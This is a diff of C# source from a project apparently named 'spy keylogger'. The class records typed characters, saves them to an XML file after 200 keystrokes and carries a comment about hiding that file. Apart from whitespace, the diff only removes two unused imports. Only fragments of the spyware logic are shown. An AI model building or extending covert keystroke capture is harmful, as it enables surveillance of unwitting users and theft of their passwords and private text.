@@ -1,27 +1,25 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Text;
-using System.Windows.Forms;
 using System.Drawing;
 using System.IO;
 using System.Xml.Serialization;
 using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
-using Outlook = Microsoft.Office.Interop.Outlook;
 using System.Net.Mail;
 using System.Threading;
 
 namespace ProjetEspionKeyLogger
 {
     class KeyLogger
-    {   
+    {
 
 
         //ede
         //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
         private CollectionEnregistrement collection_enregistrement;
-    
+
 
         //Constructeur(peut etre pas nécessaire)
         public KeyLogger()
@@ -70,7 +68,7 @@ namespace ProjetEspionKeyLogger
                         enregistrement.ajouterContenu((char)codeASCII);
 
                         //probleme : tout en majuscule + certaines touches non detectées
-                       
+
                         //Si touche Entrée
                         if (codeASCII == 13)
                         {
@@ -89,7 +87,7 @@ namespace ProjetEspionKeyLogger
                         //Si plus de 100 caracteres ont été tapé
                         if (nb_caractere_tape > 200)
                         {
-                           //On enregistre le contenue en xml
+                            //On enregistre le contenue en xml
                             collection_enregistrement.saveToXml("TestXML.xml");
 
                             //on cache le xml
